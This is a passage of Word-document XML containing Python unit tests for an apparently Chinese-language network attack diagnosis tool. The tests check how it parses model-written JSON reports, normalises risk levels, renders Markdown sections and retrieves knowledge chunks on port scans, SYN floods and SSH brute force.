        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BF6965A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52A48CEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_parse_handles_fenced_json_and_surrounding_prose():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DF7B97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    text = '好的，报告如下：\n```json\n{"summary":"端口扫描","risk":"high",' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0683C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">           '"evidence":["RST 计数高"],"actions":["封禁源 IP"],"principle":"扫描利用半开连接"}\n```\n以上。'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68904A60">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    d = parse_diagnosis(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3F344C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert d.summary == "端口扫描"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30170AB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert d.risk == "high"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3882C0C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert d.evidence and d.actions and d.principle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445A7382">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert validate(d) == []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE8597B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C528FF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53931FDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_unknown_risk_word_is_normalized_to_enum():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E90290A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：模型写成"中高危"这类不在枚举里的值时，看板的颜色映射会静默失效。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10046EF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    d = parse_diagnosis('{"summary":"x","risk":"中高危","evidence":["a"],"actions":["b"],"principle":"c"}')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246E53BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert d.risk in RISK_LEVELS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A99567">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert d.risk == "high"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79727B81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EE5D82A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="246C5829">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_validate_reports_missing_sections():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C063AF8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    d = parse_diagnosis('{"summary":"","risk":"low","evidence":[],"actions":[],"principle":""}')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB4298F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    problems = validate(d)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0977BCF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(problems) == 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F112DE5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="377E6EE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22B2A47C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_markdown_has_all_five_sections():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB569CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    d = parse_diagnosis(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DACCDD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        '{"summary":"s","risk":"high","evidence":["e"],"actions":["a"],"principle":"p"}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B52413">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FEDD22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    md = d.to_markdown()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441CA817">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for title in ("事件概述", "风险等级", "证据链", "处置建议", "协议原理回顾"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C81276">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert title in md</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC7E8AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69F3BA9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6845EFBD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 检索</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099979AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="157EF1D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14B3422F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_chinese_tokenizer_uses_bigrams():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CD10E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    tokens = tokenize("端口扫描")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9E5BE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "端口" in tokens and "扫描" in tokens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C6EFB3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "端" not in tokens  # 单字不参与，避免噪声</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D009D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DE43D49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A030BB2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_retrieval_finds_the_right_chunk():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E12B936">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    r = Retriever(str(CHUNKS))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644DC3DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for query, expect in [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61851FCC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("端口扫描 大量 RST 目的端口分散", "port-scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6583424B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("SYN 洪泛 半连接队列", "syn-flood"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F3A21B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("暴力破解 SSH 认证失败", "brute-force"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E00E70D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291ABF1F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        got = [c["id"] for c in r.retrieve(query, top_k=3)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0E5435">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert expect in got, f"{query} 没检索到 {expect}，实际 {got}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6804A5F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40A73AC9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A228EDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_retrieval_returns_empty_for_empty_query():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B054F85">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    r = Retriever(str(CHUNKS))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D17F71F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert r.retrieve("", top_k=3) == []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D095CAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A14C427">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A352A40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 推理契约</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB08405">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22E76A12">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E380760">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@pytest.fixture(scope="module")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CE288C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def detector():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76444C0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not MODEL.exists():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FAAABD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pytest.skip("还没有训练产物，先跑 models/train.py")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39545734">
      <w:pPr>
